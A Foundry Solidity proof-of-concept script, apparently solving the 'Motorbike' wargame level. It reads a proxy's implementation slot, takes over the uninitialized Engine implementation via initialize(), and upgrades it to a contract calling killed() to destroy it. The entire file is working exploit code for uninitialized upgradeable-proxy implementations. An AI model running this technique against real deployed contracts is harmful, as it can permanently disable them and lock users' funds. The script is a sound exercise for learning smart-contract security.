// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "../instances/Motorbike.sol";


contract POC is Script {

    Motorbike motorbike = Motorbike(0x16A09fFc12891593A0Dd6c3B833Cf146f70D1716);
    Engine engineAddress = Engine(address(uint160(uint256(vm.load(address(motorbike), 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)))));

    function run() external{
        vm.startBroadcast();
    
        engineAddress.initialize();
        console.log("Upgrader is :", engineAddress.upgrader());
        bytes memory encodedData = abi.encodeWithSignature("killed()");
        engineAddress.upgradeToAndCall(0x119a787c042E5f5359794B48Be5Ee0618C2C69A7, encodedData);
        
        vm.stopBroadcast();
    }
}

